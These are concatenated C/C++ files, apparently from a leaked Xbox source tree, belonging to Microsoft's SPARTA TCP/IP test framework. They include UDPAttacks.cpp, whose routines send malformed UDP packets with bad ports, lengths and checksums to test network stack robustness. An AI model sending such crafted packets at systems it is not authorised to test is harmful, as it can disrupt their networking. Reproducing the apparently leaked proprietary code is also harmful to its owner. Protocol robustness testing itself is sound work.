*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __ADAPTERINFO_H__
#define __ADAPTERINFO_H__


#define TARDIS_802_ADDR_LENGTH 6
#define TARDIS_ADDR_LENGTH 6

typedef struct _ADAPTER
{
    ULONG AdapterIndex;
    UCHAR MacAddress[TARDIS_ADDR_LENGTH];
} ADAPTER, *PADAPTER;                                                       

typedef struct _ADAPTER_INFO
{
    ULONG   cAdapters;
    ULONG   cbAddressLength;
    ADAPTER Adapters[1];
} ADAPTER_INFO, *PADAPTER_INFO;


#endif __ADAPTERINFO_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\arp.h ===
#ifndef __SPARTA_ARP_H__
#define __SPARTA_ARP_H__



#pragma pack(push,origpack)

#pragma pack(1)

#define ETHERNET_ADDRESS_LENGTH  6

#define ARP_REQUEST 1
#define ARP_REPLY 2

typedef struct
{
    USHORT HardType;
    USHORT ProtType;
    UCHAR  HardSize;
    UCHAR  ProtSize;
    USHORT OpCode;
    UCHAR  SrcEth[6];
    unsigned long  SrcIP;
    UCHAR  DstEth[6];
    unsigned long  DstIP;
} ARP_PKT_TYPE, *pARP_PKT_TYPE;

#pragma pack(pop,origpack)


#endif // __SPARTA_ARP_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\arppacket.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: ArpPacket.hpp                                                               *
* Description: this defines the IP ARP Packet class for Media Packets,                  *
*              extends the Packet class                                                 *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       balasha       4/03/2000    created                              *
*                       jbekmann      5/31/2000    made destructor virtual              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_ARPPACKET_H__
#define __SPARTA_ARPPACKET_H__

#include "sparta.h"
#include "arp.h"
#include "MacHeader.hpp"
#include "Packet.hpp"
#include "ArpHeader.hpp"
#include "MacPacket.hpp"


class CArpPacket : public CMacPacket
{

public:
	CArpHeader & ArpHeader;

	/**++
	C'tor Description:
		This ctor will be used by the parser
	--*/
	CArpPacket(PKT_PACKET Packet, CMacHeader &MacHeaderParam, CArpHeader &ArpHeaderParam);
	
	virtual int GetPacketType();

	CArpPacket(MAC_MEDIA_TYPE MediaType);
	virtual ~CArpPacket();
   
    virtual void PrintPacket();
};

#endif // __SPARTA_ARPPACKET_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\HackAttack\UDPAttacks.cpp ===
// UDPAttacks.cpp : Contains the Sparta code for various UDP layer attacks
//

#include "stdafx.h"
#include "AttackConstants.h"

//==================================================================================
// SendUDPPacket
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet with the specified parameters
//
// Arguments:
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL SendUDPPacket(CInterface *pInterface, CHAR *szDestMac, CHAR *szDestIP, WORD wDestPort, CHAR *szSourceIP, WORD wSourcePort, WORD wLength, BOOL fCalcLength, WORD wChecksum, BOOL fCalcChecksum, DWORD dwPayloadSize)
{
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	CHAR *pBuffer = NULL;
	BOOL fSuccess = TRUE, fUDPPacket = FALSE;

	if(!szDestMac || (strlen(szDestMac) < 12))
		return FALSE;

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Watch for SPARTA exceptions
	try
	{
		// Create a destination mac address from the address reported by the client
		MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
		CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);
		
		// Create the packet
		if(dwPayloadSize >= UDPHEADER_SIZE)
		{
			fUDPPacket = TRUE;
			pIPPacket = new CUDPPacket(MediaType);
		}
		else
			pIPPacket = new CIPPacket(MediaType);
		
		// Fill in the IP information from the input parameters
		pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
		pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
		pIPPacket->MacHeader.SetProtocolType(0x800);
		pIPPacket->IPHeader.SetVersion(4);
		pIPPacket->IPHeader.SetTOS(0);
		pIPPacket->IPHeader.SetID(1);
		pIPPacket->IPHeader.SetFlag(0);
		pIPPacket->IPHeader.SetFragOffset(0);
		pIPPacket->IPHeader.SetTTL(64);
		pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
		pIPPacket->IPHeader.SetDestAddr(szDestIP);
		pIPPacket->IPHeader.SetSrcAddr(szSourceIP);
		pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
		pIPPacket->IPHeader.SetAutoCalcChecksum(ON);
				
		// If we are dealing with a packet large enough for the UDP header
		if(fUDPPacket)
		{
			CUDPPacket *pUDPPacket = (CUDPPacket *) pIPPacket;
			
			pUDPPacket->UDPHeader.SetSrcPort(wSourcePort);
			pUDPPacket->UDPHeader.SetDestPort(wDestPort);

			// Set up the length fields
			if(fCalcLength)
			{
				pUDPPacket->UDPHeader.SetAutoCalcLength(ON);
				pUDPPacket->IPHeader.SetAutoCalcDatagramLength(ON);
			}
			else
			{
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pUDPPacket->UDPHeader.SetLength(wLength);
				pUDPPacket->IPHeader.SetDatagramLength(wLength + IPHEADER_SIZE);
			}
			
			// Set up the checksum field
			if(fCalcChecksum)
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(ON);
			else
			{
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(wChecksum);
			}
		}
		// Otherwise, this packet is too small for the UDP header
		else
		{
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);
		}

		// If we are to send data beyond the header, set up the data buffer
		if(dwPayloadSize > UDPHEADER_SIZE)
		{	
			// Create the buffer for the remaining packet data
			pBuffer = (CHAR *) LocalAlloc(LPTR, dwPayloadSize - UDPHEADER_SIZE);
			memset(pBuffer, (int) 'x', dwPayloadSize - UDPHEADER_SIZE);
			
			// Associate that buffer with the packet
			pIPPacket->SetUserBuffer(pBuffer, dwPayloadSize - UDPHEADER_SIZE, TRUE);				
		}
		else if((dwPayloadSize > IPHEADER_SIZE) && !fUDPPacket)
		{
			// Create the buffer for the remaining packet data
			pBuffer = (CHAR *) LocalAlloc(LPTR, dwPayloadSize - IPHEADER_SIZE);
			memset(pBuffer, (int) 'x', dwPayloadSize - IPHEADER_SIZE);
			
			// Associate that buffer with the packet
			pIPPacket->SetUserBuffer(pBuffer, dwPayloadSize - IPHEADER_SIZE, TRUE);				
		}
		
		pInterface->Send(pIPPacket);
	}
	catch(CSpartaException *Ex)
	{
		delete Ex;
		fSuccess = FALSE;
	}

	delete pIPPacket;

	// Release the payload buffer
	pBuffer ? LocalFree(pBuffer) : 0;

	return fSuccess;
}

//==================================================================================
// UDPSourceMaxAttack
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet from the maximum port number
//
// Arguments:
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPSourceMaxAttack (CInterface *pInterface, CHAR *szDestMac)
{
	return SendUDPPacket(pInterface, szDestMac, IPADDR_DEST, UDPPORT_DEST, IPADDR_SOURCE, MAXWORD, 0, TRUE, 0, TRUE, UDPHEADER_SIZE + 2);
}

//==================================================================================
// UDPSourceMinAttack
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet from the minimum port number
//
// Arguments:
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPSourceMinAttack (CInterface *pInterface, CHAR *szDestMac)
{
	return SendUDPPacket(pInterface, szDestMac, IPADDR_DEST, UDPPORT_DEST, IPADDR_SOURCE, 1, 0, TRUE, 0, TRUE, UDPHEADER_SIZE + 2);
}

//==================================================================================
// UDPSourceZeroAttack
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet from port number zero
//
// Arguments:
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPSourceZeroAttack (CInterface *pInterface, CHAR *szDestMac)
{
	return SendUDPPacket(pInterface, szDestMac, IPADDR_DEST, UDPPORT_DEST, IPADDR_SOURCE, 0, 0, TRUE, 0, TRUE, UDPHEADER_SIZE + 2);
}

//==================================================================================
// UDPDestMaxAttack
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet to the maximum port number
//
// Arguments:
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPDestMaxAttack (CInterface *pInterface, CHAR *szDestMac)
{
	return SendUDPPacket(pInterface, szDestMac, IPADDR_DEST, MAXWORD, IPADDR_SOURCE, UDPPORT_SOURCE, 0, TRUE, 0, TRUE, UDPHEADER_SIZE + 2);
}

//==================================================================================
// UDPDestMinAttack
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet to the minimum port number
//
// Arguments:
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPDestMinAttack (CInterface *pInterface, CHAR *szDestMac)
{
	return SendUDPPacket(pInterface, szDestMac, IPADDR_DEST, 1, IPADDR_SOURCE, UDPPORT_SOURCE, 0, TRUE, 0, TRUE, UDPHEADER_SIZE + 2);
}

//==================================================================================
// UDPDestZeroAttack
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet to port number zero
//
// Arguments:
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPDestZeroAttack (CInterface *pInterface, CHAR *szDestMac)
{
	return SendUDPPacket(pInterface, szDestMac, IPADDR_DEST, 0, IPADDR_SOURCE, UDPPORT_SOURCE, 0, TRUE, 0, TRUE, UDPHEADER_SIZE + 2);
}

//==================================================================================
// UDPLenBelowMinAttack
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet with a length below the minimum
//
// Arguments:
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPLenBelowMinAttack (CInterface *pInterface, CHAR *szDestMac)
{
	return SendUDPPacket(pInterface, szDestMac, IPADDR_DEST, UDPPORT_DEST, IPADDR_SOURCE, UDPPORT_SOURCE, UDPHEADER_SIZE - 1, FALSE, 0, TRUE, UDPHEADER_SIZE);
}

//==================================================================================
// UDPLenAtMinAttack
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet with a length of exactly the minimum
//
// Arguments:
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPLenAtMinAttack (CInterface *pInterface, CHAR *szDestMac)
{
	return SendUDPPacket(pInterface, szDestMac, IPADDR_DEST, UDPPORT_DEST, IPADDR_SOURCE, UDPPORT_SOURCE, UDPHEADER_SIZE, FALSE, 0, TRUE, UDPHEADER_SIZE);
}

//==================================================================================
// UDPLenAboveMinAttack
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet with a length above the minimum
//
// Arguments:
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPLenAboveMinAttack (CInterface *pInterface, CHAR *szDestMac)
{
	return SendUDPPacket(pInterface, szDestMac, IPADDR_DEST, UDPPORT_DEST, IPADDR_SOURCE, UDPPORT_SOURCE, UDPHEADER_SIZE + 1, FALSE, 0, TRUE, UDPHEADER_SIZE + 1);
}

//==================================================================================
// UDPLenAboveTotalAttack
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet with a length above total bytes in packet
//
// Arguments:
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPLenAboveTotalAttack (CInterface *pInterface, CHAR *szDestMac)
{
	return SendUDPPacket(pInterface, szDestMac, IPADDR_DEST, UDPPORT_DEST, IPADDR_SOURCE, UDPPORT_SOURCE, UDPHEADER_SIZE + 1, FALSE, 0, TRUE, UDPHEADER_SIZE);
}

//==================================================================================
// UDPLenBelowTotalAttack
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet with a length below the total bytes in packet
//
// Arguments:
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPLenBelowTotalAttack (CInterface *pInterface, CHAR *szDestMac)
{
	return SendUDPPacket(pInterface, szDestMac, IPADDR_DEST, UDPPORT_DEST, IPADDR_SOURCE, UDPPORT_SOURCE, UDPHEADER_SIZE + 1, FALSE, 0, TRUE, UDPHEADER_SIZE + 2);
}

//==================================================================================
// UDPLenMaxAttack
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet with a length below the total bytes in packet
//
// Arguments:
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPLenMaxAttack (CInterface *pInterface, CHAR *szDestMac)
{
	return SendUDPPacket(pInterface, szDestMac, IPADDR_DEST, UDPPORT_DEST, IPADDR_SOURCE, UDPPORT_SOURCE, 1500 - IPHEADER_SIZE, FALSE, 0, TRUE, 1500 - IPHEADER_SIZE);
}

//==================================================================================
// UDPCheckOnesAttack
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet with a valid checksum of all ones
//
// Arguments:
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPCheckOnesAttack (CInterface *pInterface, CHAR *szDestMac)
{
	return SendUDPPacket(pInterface, szDestMac, IPADDR_DEST, UDPPORT_DEST, IPADDR_SOURCE, UDPPORT_SOURCE, 0, TRUE, 0xFFFF, FALSE, UDPHEADER_SIZE + 2);
}

//==================================================================================
// UDPCheckZerosAttack
//----------------------------------------------------------------------------------
//
// Description: Test that sends a UDP packet with a checksum of all zeros (indicating not computed)
//
// Arguments:
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL UDPCheckZerosAttack (CInterface *pInterface, CHAR *szDestMac)
{
	return SendUDPPacket(pInterface, szDestMac, IPADDR_DEST, UDPPORT_DEST, IPADDR_SOURCE, UDPPORT_SOURCE, 0, TRUE, 0x0000, FALSE, UDPHEADER_SIZE + 2);
}

PATTACK_FUNCTION g_UDPAttackFunctions[UDPATTACK_MAXTEST] = 
{
	UDPSourceMaxAttack,
	UDPSourceMinAttack,
	UDPSourceZeroAttack,
	UDPDestMaxAttack,
	UDPDestMinAttack,
	UDPDestZeroAttack,
	UDPLenBelowMinAttack,
	UDPLenAtMinAttack,
	UDPLenAboveMinAttack,
	UDPLenAboveTotalAttack,
	UDPLenBelowTotalAttack,
	UDPLenMaxAttack,
	UDPCheckOnesAttack,
	UDPCheckZerosAttack
};
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\arpheader.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: ArpHeader.hpp                                                               *
* Description: this defines the IP ARP Header class for Media Packets,                  *
*              extends the Packet class                                                 *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       balasha       4/18/2000    created                              *
*                       jbekmann      5/17/2000    added CMacAddress methods            *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/
#ifndef __SPARTA_ARPHEADER_H__
#define __SPARTA_ARPHEADER_H__

#include "sparta.h"
#include "packets.h"
#include "arp.h"

#include "media.h"
#include "Parser.hpp"
#include "MacPacket.hpp"
#include "MacHeader.hpp"


class CArpHeader
{
   friend class CArpPacket;

protected:

   PKT_BUFFER m_ArpBuffer;
   pARP_PKT_TYPE pArpHeader;

public:

   CArpHeader();
   CArpHeader::CArpHeader(PVOID pvRawData, DWORD dwBytesRemaining, 
                          OUT PDWORD pdwBytesRead);
   
   SPARTA_STATUS SetHardType(const USHORT Hard);
   SPARTA_STATUS SetProtType(const USHORT Prot);
   SPARTA_STATUS SetHardSize(const UCHAR  HardSize);
   SPARTA_STATUS SetProtSize(const UCHAR ProtSize);

   SPARTA_STATUS SetOpCode(const USHORT OpCode);
   SPARTA_STATUS SetSrcIP(const TCHAR * IPAddress)
   {
      return SetSrcIP(inet_addr(IPAddress));
   }
   SPARTA_STATUS SetDestIP(const TCHAR * IPAddress)
   {
      return SetDestIP(inet_addr(IPAddress));
   }

   SPARTA_STATUS SetSrcIP(unsigned long IPAddress);
   SPARTA_STATUS SetDestIP(unsigned long IPAddress);

   SPARTA_STATUS SetSrcMac(const TCHAR * MacAddress);
   SPARTA_STATUS SetDestMac(const TCHAR * MacAddress);

   SPARTA_STATUS SetSrcMac(const CMacAddress &MacAddress);
   SPARTA_STATUS SetDestMac(const CMacAddress &MacAddress);

   USHORT GetHardType();
   USHORT GetProtType();
   UCHAR  GetHardSize();
   UCHAR  GetProtSize();
   USHORT GetOpCode();
        
   //
   // values returned are in NETWORK btye order
   //
   unsigned long GetSrcIP();
   unsigned long GetDestIP();

   SPARTA_STATUS GetSrcMac(TCHAR * MacAddress,  DWORD * AddressLength);
   SPARTA_STATUS GetDestMac(TCHAR * MacAddress, DWORD * AddressLength);

   SPARTA_STATUS GetSrcMac(CMacAddress &MacAddress);
   SPARTA_STATUS GetDestMac(CMacAddress &MacAddress);


   ~CArpHeader();

   void Print();
};


#endif //__SPARTA_ARPHEADER_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\commandstructs.h ===
/*
 * File : CommandStructs.h
 * Author : Sandeep Prabhu
 * Revision History
 *      28/4/2000       sandeep           Created
 *
 * Structures used by the stubs in AutoSrv and Controller to send and receive data
 */

#ifndef __COMMANDSTRUCTS__H
#define __COMMANDSTRUCTS__H

#include <windows.h>
#include "common.h"
 
#define ANY_SIZE 1

#pragma pack(1)
/*
 *  New data types
 */                              
typedef struct
{
    BYTE bAddr[MAX_IPADDR_LEN];
    int iLength;
} IPADDR, *PIPADDR;

typedef struct
{
    BYTE bAddr[MAX_MACADDR_LEN];
    int iLength;
} MACADDR, *PMACADDR;  
                 
/*
 * Valid command codes supported by AutoSrv
 */               
typedef enum {
    CC_Cleanup,
    CC_Reboot,
    CC_SetPowerState,
    CC_System,
    CC_Ping,
    CC_IPHlpApiStart,
    CC_GetArpCache,
    CC_FlushArpCache,
    CC_DeleteArpCacheEntry,
    CC_AddArpCacheEntry,
    CC_CheckArpCacheEntry,
    CC_GetRouteTable,
    CC_DeleteRouteTableEntry,
    CC_AddRouteTableEntry,
    CC_GetNumInterfaces,
    CC_GetInterfaceIndex,
    CC_GetIndexByIP,
    CC_DeleteIP,
    CC_AddIP,
    CC_SendArp,
    CC_IPHlpApiEnd,
    CC_RegistryStart,
    CC_CreateRegistryKey, 
    CC_DeleteRegistryKey,
    CC_DeleteRegistryValue,
    CC_SetRegistryValue,
    CC_GetRegistryValue,
    CC_SetRegistryValueByIp,
    CC_GetRegistryValueByIp,
    CC_DeleteRegistryValueByIp,
    CC_RegistryEnd,
    CC_SessionStart,
    CC_Socket,
    CC_Bind,
    CC_CreateAndBind,
    CC_SetSocketOption,
    CC_Connect,
    CC_ConnectEx,
    CC_CreateAndConnect,
    CC_Accept,
    CC_CreateAndAccept,
    CC_Send,
    CC_OverlappedSend,
    CC_SendAndDisconnect,
    CC_Receive,
    CC_GetSessionStats,
    CC_GetCurrentStatus,
    CC_Stop,
    CC_Close,
    CC_Reset,
    CC_Shutdown,
    CC_SessionEnd,
    CC_Unknown
} tCommandCode;

/*
 *  Response structure
 */
#define RESPONSE_HEADER_LENGTH (sizeof(tCommandCode)+3*sizeof(DWORD))

typedef struct _tGenericResponse {         
    tCommandCode CommandCode;
    DWORD dwTID;         
    DWORD dwStatus;
    DWORD dwDataSize;
    BYTE  abData[ANY_SIZE];
 } tGenericResponse;


/* 
 * Generic portion command to all requests sent out by Controller
 */
typedef struct {
    tCommandCode CommandCode;
    DWORD dwTID;
} tGenericStruct;


/*
 * Structures for specific commands
 */

typedef struct {
    tGenericStruct GenericPart;
} tArgs_Cleanup, tArgs_Reboot, tArgs_Ping, tArgs_GetArpCache, tArgs_GetRouteTable, tArgs_GetNumInterfaces;


typedef struct {
    tGenericStruct GenericPart;
    DWORD dwLength;
    BOOL fSuspend;
    ULONG ulTimeout;
} tArgs_SetPowerState;

typedef struct {
    tGenericStruct GenericPart;
    DWORD dwLength;
    TCHAR aszCommand[ANY_SIZE];
} tArgs_System;

typedef struct
{
    tGenericStruct GenericPart;
    DWORD dwAdapterIndex;
} tArgs_FlushArpCache;

typedef struct
{
    tGenericStruct GenericPart;
    DWORD dwAdapterIndex;
    IPADDR IPAddress;
    MACADDR MacAddress;
    DWORD dwType;
} tArgs_DeleteArpCacheEntry, tArgs_AddArpCacheEntry;

typedef struct
{
    tGenericStruct GenericPart;
    DWORD dwAdapterIndex;
    IPADDR IPAddress;
    MACADDR MacAddress;
} tArgs_CheckArpCacheEntry;

typedef struct
{
    tGenericStruct GenericPart;
    DWORD dwAdapterIndex;
    IPADDR TargetIP;
    IPADDR GWIP;
    IPADDR Mask;
    DWORD dwMetric;
    DWORD dwType;
} tArgs_DeleteRouteTableEntry, tArgs_AddRouteTableEntry;


typedef struct
{
    tGenericStruct GenericPart;
    IPADDR IPAddress;
} tArgs_GetIndexByIP;

typedef struct
{
    tGenericStruct GenericPart;
    TCHAR pszFriendlyName[MAX_INTERFACE_NAME_LENGTH];
} tArgs_GetInterfaceIndex;

typedef struct
{
    tGenericStruct GenericPart;
    ULONG ulNTEContext;
} tArgs_DeleteIP;

typedef struct
{
    tGenericStruct GenericPart;
    DWORD dwAdapterIndex;
    IPADDR IPAddress;
    IPADDR Mask;
} tArgs_AddIP;

typedef struct
{
    tGenericStruct GenericPart;
    IPADDR DestIP;
    IPADDR SrcIP;
} tArgs_SendArp;


typedef struct 
{
    tGenericStruct GenericPart;
    HKEY hMainKey;
    TCHAR aszSubKey[MAX_REG_SUBKEY_LENGTH];
    DWORD dwOptions;
    REGSAM Sam;
} tArgs_CreateRegistryKey;

typedef struct 
{
    tGenericStruct GenericPart;
    HKEY hMainKey;
    TCHAR aszSubKey[MAX_REG_SUBKEY_LENGTH];
} tArgs_DeleteRegistryKey;

typedef struct 
{
    tGenericStruct GenericPart;
    HKEY hMainKey;
    TCHAR aszSubKey[MAX_REG_SUBKEY_LENGTH];
    TCHAR aszValueName[MAX_REG_VALUENAME_LENGTH];
} tArgs_DeleteRegistryValue;


typedef struct 
{
    tGenericStruct GenericPart;
    HKEY hMainKey;
    TCHAR aszIPAddress[20];
    TCHAR aszValueName[MAX_REG_VALUENAME_LENGTH];
} tArgs_DeleteRegistryValueByIp;

typedef struct 
{
    tGenericStruct GenericPart;
    HKEY hMainKey;
    TCHAR aszSubKey[MAX_REG_SUBKEY_LENGTH];
    TCHAR aszValueName[MAX_REG_VALUENAME_LENGTH];
    DWORD dwType;
    BYTE abData[MAX_REG_VALUE_LENGTH];
    DWORD dwDataLen;
} tArgs_SetRegistryValue;


typedef struct 
{
    tGenericStruct GenericPart;
    HKEY hMainKey;
    TCHAR aszIPAddress[20];
    TCHAR aszValueName[MAX_REG_VALUENAME_LENGTH];
    DWORD dwType;
    BYTE abData[MAX_REG_VALUE_LENGTH];
    DWORD dwDataLen;
} tArgs_SetRegistryValueByIp;


typedef struct 
{
    tGenericStruct GenericPart;
    HKEY hMainKey;
    TCHAR aszSubKey[MAX_REG_SUBKEY_LENGTH];
    TCHAR aszValueName[MAX_REG_VALUENAME_LENGTH];
} tArgs_GetRegistryValue;

typedef struct 
{
    tGenericStruct GenericPart;
    HKEY hMainKey;
    TCHAR aszIPAddress[20];
    TCHAR aszValueName[MAX_REG_VALUENAME_LENGTH];
} tArgs_GetRegistryValueByIp;


/*
 * Session command structs
 */
typedef struct {
    tGenericStruct GenericPart;
    DWORD dwSessionId;    
} tGenericSessionStruct, tArgs_GetSessionStats, tArgs_Close, tArgs_Reset, tArgs_Shutdown;

typedef struct {
    tGenericStruct GenericPart;
    DWORD dwSessionId;
    INT iType;
} tArgs_Socket;

typedef struct {
    tGenericStruct GenericPart;
    DWORD dwSessionId;
    IPADDR SrcIP;
    USHORT usSrcPort;
} tArgs_Bind;

typedef struct {
    tGenericStruct GenericPart;
    DWORD dwSessionId;
    INT iType;
    IPADDR SrcIP;
    USHORT usSrcPort;
} tArgs_CreateAndBind;

typedef struct {
    tGenericStruct GenericPart;
    DWORD dwSessionId;
    INT iLevel;
    INT iOption;
    CHAR achValue[MAX_OPTION_SIZE];
    INT iSize;
} tArgs_SetSocketOption;

typedef struct {
    tGenericStruct GenericPart;
    DWORD dwSessionId;
    INT iType;
    IPADDR SrcIP;
    USHORT usSrcPort;
    IPADDR DestIP;
    USHORT usDestPort;
} tArgs_CreateAndConnect;

typedef struct {
    tGenericStruct GenericPart;
    DWORD dwSessionId;
    IPADDR DestIP;
    USHORT usDestPort;
} tArgs_Connect;


typedef struct {
    tGenericStruct GenericPart;
    DWORD dwSessionId;
    IPADDR DestIP;
    USHORT usDestPort;
    INT iBufferSize;
    BOOL fBufferSpecified;
    CHAR achBuffer[ANY_SIZE];
} tArgs_ConnectEx;

typedef struct {
    tGenericStruct GenericPart;
    DWORD dwSessionId;
    INT iType;
    IPADDR SrcIP;
    USHORT usSrcPort;
    INT iListenQ;
} tArgs_CreateAndAccept;

typedef struct {
    tGenericStruct GenericPart;
    DWORD dwSessionId;
    INT iListenQ;
} tArgs_Accept;

typedef struct {
    tGenericStruct GenericPart;
    DWORD dwSessionId;
    DWORD dwIterations;
    DWORD dwDelay;
    INT iBufferSize;
    BOOL fBufferSpecified;
    CHAR achBuffer[ANY_SIZE];
} tArgs_Send;

typedef struct {
    tGenericStruct GenericPart;
    DWORD dwSessionId;
    INT iNumBuffers;
    INT iBufferSize;
} tArgs_OverlappedSend;

typedef struct {
    tGenericStruct GenericPart;
    DWORD dwSessionId;
    DWORD dwIterations;
    DWORD dwDelay;
    INT iBufferSize;
} tArgs_Receive;


typedef struct {
    tGenericStruct GenericPart;
    DWORD dwSessionId;
    DWORD dwAsyncTID;
} tArgs_GetCurrentStatus, tArgs_GetAsyncCompletionStatus, tArgs_Stop;

/*
 * Command specific responses
 */
typedef struct {
    DWORD dwBytesSent;
    DWORD dwBytesRcvd;
} tResponse_GetSessionStats;


typedef struct 
{
    DWORD dwType;
    DWORD dwDataLen;
    BYTE abValue[ANY_SIZE];
} tResponse_GetRegistryValue;
#pragma pack()
      
#endif
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\common.h ===
/*
 * File : Controller.cpp
 * Author : Sandeep Prabhu
 * Revision History
 *      28/4/2000       sandeep           Created
 *
 * Contains stuff shared between AutoSrv and Controller
 */
 
#ifndef __COMMON__H
#define __COMMON__H

 
/*********************************************************************************
 * Constants
 *********************************************************************************/ 
//
// Max size of a request/response packet
//
#define MAX_PACKET_LENGTH           65535
//
// Maximum length (in bytes) of IP address
//
#define MAX_IPADDR_LEN              16
//
// Maximum length (in bytes) of MAC addres
//
#define MAX_MACADDR_LEN             6
//
// Maximum lenght of friendly name for an interface
//
#define MAX_INTERFACE_NAME_LENGTH   256
//
// Maximum size of an option set on a socket
//
#define MAX_OPTION_SIZE             8
//
// Maximum size of the subkey
//
#define MAX_REG_SUBKEY_LENGTH       256
//
// Maximum size of value name
//
#define MAX_REG_VALUENAME_LENGTH    256
//
// Maximum size of value
//
#define MAX_REG_VALUE_LENGTH        256
//
// The port on which AutoSrv is listening
//
#define AUTOSRV_PORT                9000

  

                                                                                  
/*********************************************************************************
 * Error codes
 *********************************************************************************/ 
//
// Malloc failure
//
#define ERROR_MALLOC                ERROR_OUTOFMEMORY       
//
// An invalid (TID/Command code don't match with request) response is received from AutoSrv
//
#define ERROR_INVALID_RESPONSE      ERROR_INVALID_MESSAGE
//
// An invalid argument was passed to a command
//                                     
#define ERROR_INVALID_ARGUMENT      ERROR_INVALID_PARAMETER
//
// No error code has been specified
//
#define NO_ERROR_CODE               4
//
// Invalid command code
//
#define ERROR_INVALID_COMMAND       ERROR_BAD_COMMAND
//
// Session has been terminated
//
#define ERROR_SESSION_CLOSED        6



#define SERVICE_NAME            "AutoSrv" // Name of the service


#define MAX_DEBUG_STRING_LENGTH 255       // Max length of a string to be dumped on debugger

void DebugMsg(INT iLevel, _TCHAR* pszFormat, ...);
               
  
      
#endif
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\controller.h ===
/*
 * File : Controller.h
 * Author : Sandeep Prabhu
 * Revision History
 *      27/4/2000       sandeep           Created
 *
 * The Controller object is teh client side of AutoSrv and exposes the APIs provided by
 * AutoSrv to the upper level clients - COM objects, C++ programs. It is totally transparent
 * to the underlying driver. The clients need to provide it Send and Receive callback funtions
 * along with an I/O context
 */
 
#ifndef __CONTROLLER__H
#define __CONTROLLER__H

#include <winsock2.h>
#include <iphlpapi.h>
#include <tchar.h>
#include <windows.h>
#include "CommandStructs.h"
                  
